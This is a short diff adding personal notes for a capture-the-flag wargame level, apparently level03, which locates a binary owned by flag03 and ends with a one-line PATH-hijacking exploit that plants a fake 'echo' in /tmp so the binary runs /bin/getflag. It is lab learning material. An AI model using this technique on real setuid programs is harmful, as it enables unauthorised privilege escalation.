@@ -1,0 +1,11 @@
+find -user flag03
+(comes up with ./level03)
+
+./level03
+(Says exploit me)
+
+File echoes out "Exploit me"
+
+Change what it echoes by using exploit:
+
+echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03
